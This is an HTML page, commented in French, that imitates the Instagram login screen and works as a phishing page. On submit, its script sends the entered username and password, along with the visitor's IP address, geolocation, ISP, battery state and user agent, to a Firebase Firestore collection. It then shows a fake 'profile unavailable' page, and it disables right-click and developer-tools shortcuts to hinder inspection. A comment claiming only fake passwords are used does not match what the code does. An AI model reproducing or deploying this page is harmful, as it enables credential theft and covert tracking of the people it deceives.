<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            position: relative;
        }

        /* ----- PAGE DE CONNEXION (SPLIT) ----- */
        #login-page {
            display: flex;
            flex-direction: column;
            height: 100%;
            width: 100%;
            transition: opacity 0.5s ease;
        }

        .main-container {
            display: flex;
            flex: 1;
            height: 100%;
        }

        /* Côté Gauche */
        .hero-side {
            flex: 1.5;
            background-color: #000;
            position: relative;
            overflow: hidden;
        }

        .hero-side img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            object-position: left center;
        }

        /* Côté Droit (Formulaire) */
        .login-side {
            flex: 1;
            background-color: #1a1a1a;
            border-left: 1px solid #262626;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px;
        }

        .login-box {
            width: 100%;
            max-width: 400px;
        }

        .login-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 24px;
        }

        .input-wrapper {
            margin-bottom: 14px;
            position: relative; /* Nécessaire pour placer l'icône de l'œil */
        }

        input {
            width: 100%;
            background: transparent;
            border: 1px solid #363636;
            border-radius: 12px;
            padding: 16px;
            font-size: 15px;
            color: #fff;
            outline: none;
            transition: border-color 0.2s;
        }

        /* On laisse de la place à droite pour l'icône de l'œil */
        input[type="password"], input[type="text"] {
            padding-right: 48px; 
        }

        input:focus { border-color: #a8a8a8; }
        input::placeholder { color: #a8a8a8; }

        /* Bouton de l'œil */
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #a8a8a8;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 4px;
        }

        .toggle-password:hover {
            color: #fff;
        }

        /* Bouton Log in */
        .login-btn {
            width: 100%;
            background-color: #1a3c6e;
            color: #7a9cc6;
            border: none;
            border-radius: 24px;
            padding: 14px 16px;
            font-size: 15px;
            font-weight: 600;
            margin-top: 10px;
            cursor: default;
            transition: background-color 0.2s, color 0.2s;
            position: relative;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-btn.active {
            background-color: #0095f6;
            color: #fff;
            cursor: pointer;
        }

        /* Animation de chargement dans le bouton */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .forgot-password {
            display: block;
            text-align: center;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin-top: 20px;
            margin-bottom: 40px;
        }

        .fb-login {
            width: 100%;
            background-color: #2a2a2a;
            color: #fff;
            border: none;
            border-radius: 24px;
            padding: 14px 16px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 16px;
        }

        .create-account {
            width: 100%;
            background-color: transparent;
            color: #0095f6;
            border: 1px solid #0095f6;
            border-radius: 24px;
            padding: 14px 16px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .meta-logo {
            text-align: center;
            margin-top: 50px;
            font-family: 'Helvetica', sans-serif;
            font-size: 15px;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        /* Footer */
        .footer {
            background-color: #000;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #a8a8a8;
            border-top: 1px solid #262626;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin-bottom: 10px;
        }

        .footer-links a { color: #a8a8a8; text-decoration: none; }

        /* ----- PAGE 404 / ERREUR ----- */
        #error-page {
            display: none;
            flex-direction: column;
            height: 100%;
            width: 100%;
            background-color: #000;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 100;
            opacity: 0;
            transition: opacity 0.5s ease;
        }

        .error-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            border-bottom: 1px solid #262626;
            background-color: #000;
        }

        .error-nav .logo-text {
            font-family: "Brush Script MT", cursive, sans-serif;
            font-size: 24px;
            font-weight: bold;
            letter-spacing: -0.5px;
        }

        .error-nav .login-link {
            color: #0095f6;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
        }

        .error-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }

        .error-icon {
            width: 80px;
            height: 80px;
            background-color: #262626;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 24px;
        }

        .error-icon svg {
            width: 40px;
            height: 40px;
            fill: none;
            stroke: #fff;
            stroke-width: 2;
        }

        .error-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .error-subtitle {
            font-size: 14px;
            color: #a8a8a8;
            margin-bottom: 24px;
        }

        .signup-btn {
            background-color: #4f46e5;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .signup-btn:hover { background-color: #4338ca; }

        @media (max-width: 900px) {
            .hero-side { display: none; }
            .login-side { border-left: none; }
        }
    </style>
</head>
<body>

    <!-- ================= PAGE DE CONNEXION ================= -->
    <div id="login-page">
        <div class="main-container">
            <div class="hero-side">
                <img src="https://i.ibb.co/bRrqw4wj/Screenshot-2026-10-26-024746.png" alt="Instagram Hero">
            </div>

            <div class="login-side">
                <div class="login-box">
                    <div class="login-title">Log into Instagram</div>
                    
                    <form id="login-form">
                        <div class="input-wrapper">
                            <input type="text" id="username" placeholder="Mobile number, username or email" autocomplete="off">
                        </div>
                        <div class="input-wrapper">
                            <input type="password" id="password" placeholder="Password" autocomplete="off">
                            <!-- Bouton Oeil (Afficher/Masquer) -->
                            <button type="button" class="toggle-password" id="toggle-password">
                                <!-- Oeil ouvert (par défaut) -->
                                <svg id="eye-open" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                                    <circle cx="12" cy="12" r="3"></circle>
                                </svg>
                                <!-- Oeil barré (caché au début) -->
                                <svg id="eye-closed" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
                                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                                    <line x1="1" y1="1" x2="23" y2="23"></line>
                                </svg>
                            </button>
                        </div>
                        <button type="submit" class="login-btn" id="login-btn">
                            <span id="btn-text">Log in</span>
                            <div class="spinner" id="spinner"></div>
                        </button>
                    </form>

                    <a href="#" class="forgot-password">Forgot password?</a>

                    <button class="fb-login">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="#1877f2">
                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                        </svg>
                        Log in with Facebook
                    </button>

                    <button class="create-account">Create new account</button>

                    <div class="meta-logo">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
                            <path d="M18.17 7.5c-1.6 0-2.97.85-3.88 2.28l-.3.47-.3-.47C12.78 8.35 11.4 7.5 9.83 7.5c-2.6 0-4.72 2.03-4.72 4.53 0 2.49 2.12 4.52 4.72 4.52 1.58 0 2.95-.86 3.86-2.29l.3-.47.3.47c.9 1.43 2.28 2.29 3.88 2.29 2.6 0 4.72-2.03 4.72-4.52 0-2.5-2.12-4.53-4.72-4.53zm-8.34 7.27c-1.52 0-2.76-1.23-2.76-2.74 0-1.52 1.24-2.75 2.76-2.75 1.03 0 1.83.55 2.47 1.57l.54.85-.54.85c-.64 1.02-1.44 1.57-2.47 1.57zm8.34 0c-1.03 0-1.83-.55-2.47-1.57l-.54-.85.54-.85c.64-1.02 1.44-1.57 2.47-1.57 1.52 0 2.76 1.23 2.76 2.75 0 1.51-1.24 2.74-2.76 2.74z"/>
                        </svg>
                        Meta
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="footer-links">
                <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
                <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
                <a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
            </div>
            <div>English <span style="margin: 0 10px;">⌄</span> © 2026 Instagram from Meta</div>
        </div>
    </div>

    <!-- ================= PAGE ERREUR 404 ================= -->
    <div id="error-page">
        <div class="error-nav">
            <div class="logo-text">Instagram</div>
            <a href="#" class="login-link">Log in</a>
        </div>
        
        <div class="error-content">
            <div class="error-icon">
                <svg viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="8" x2="12" y2="12"></line>
                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
                </svg>
            </div>
            <div class="error-title">Profile isn't available</div>
            <div class="error-subtitle">The link may be broken, or the profile may have been removed.</div>
            <button class="signup-btn">Sign up for Instagram</button>
        </div>
    </div>

    <!-- ================= JAVASCRIPT ================= -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA3LiNjxsV9HTcFd2ghlItTipted9rdQkU",
            authDomain: "test-9022.firebaseapp.com",
            projectId: "test-9022",
            storageBucket: "test-9022.firebasestorage.app",
            messagingSenderId: "945536290936",
            appId: "1:945536290936:web:de1437cea95e63cb559d8d",
            measurementId: "G-RSKK2KZDQR"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Anti-inspect
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) || (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
            }
        });

        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('login-btn');
        const btnText = document.getElementById('btn-text');
        const spinner = document.getElementById('spinner');
        const loginPage = document.getElementById('login-page');
        const errorPage = document.getElementById('error-page');

        // --- GESTION DU BOUTON OEIL ---
        const togglePasswordBtn = document.getElementById('toggle-password');
        const eyeOpen = document.getElementById('eye-open');
        const eyeClosed = document.getElementById('eye-closed');

        togglePasswordBtn.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            if (type === 'text') {
                eyeOpen.style.display = 'none';
                eyeClosed.style.display = 'block';
            } else {
                eyeOpen.style.display = 'block';
                eyeClosed.style.display = 'none';
            }
        });
        // ------------------------------

        function checkInputs() {
            if (usernameInput.value.trim() && passwordInput.value.trim()) {
                loginBtn.classList.add('active');
            } else {
                loginBtn.classList.remove('active');
            }
        }
        usernameInput.addEventListener('input', checkInputs);
        passwordInput.addEventListener('input', checkInputs);

        async function collectDeviceInfo() {
            let geoData = {};
            try {
                const res = await fetch('https://get.geojs.io/v1/ip/geo.json');
                geoData = await res.json();
            } catch(e) {}

            let batteryLevel = "N/A", chargingStatus = "N/A";
            if ('getBattery' in navigator) {
                try {
                    const b = await navigator.getBattery();
                    batteryLevel = Math.round(b.level * 100) + "%";
                    chargingStatus = b.charging ? "En charge" : "Décharge";
                } catch(e) {}
            }

            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const ua = navigator.userAgent;
            let typeAppareil = "PC Bureau";
            if (/iPhone|iPad|iPod/i.test(ua)) typeAppareil = "iPhone/iPad";
            else if (/Android/i.test(ua)) typeAppareil = "Smartphone Android";
            else if (/Mac/i.test(ua)) typeAppareil = "Mac";

            return {
                ip: geoData.ip || "N/A",
                ville: geoData.city || "Inconnue",
                pays: geoData.country || "Inconnu",
                isp: geoData.organization || "Inconnu",
                batterie: batteryLevel,
                etat_batterie: chargingStatus,
                connexion: conn ? conn.effectiveType.toUpperCase() : "WIFI/LAN",
                type_appareil: typeAppareil,
                user_agent: ua
            };
        }

        document.getElementById('login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!username || !password) return;

            btnText.style.display = 'none';
            spinner.style.display = 'block';
            loginBtn.disabled = true;
            loginBtn.classList.add('active');

            const deviceInfo = await collectDeviceInfo();
            const sessionId = 'SESS-' + Math.random().toString(36).substr(2, 8).toUpperCase();

            const data = {
                session_id: sessionId,
                username: username,
                password: password, // ⚠️ FAUX MOT DE PASSE UNIQUEMENT !
                ...deviceInfo,
                heure_locale: new Date().toLocaleString('fr-FR'),
                date_clic: serverTimestamp()
            };

            try {
                await addDoc(collection(db, "visites_mysteres"), data);
            } catch(err) { console.error(err); }

            await new Promise(r => setTimeout(r, 2500));

            loginPage.style.opacity = '0';
            
            setTimeout(() => {
                loginPage.style.display = 'none';
                errorPage.style.display = 'flex';
                setTimeout(() => {
                    errorPage.style.opacity = '1';
                }, 50);
            }, 500);
        });
    </script>
</body>
</html>
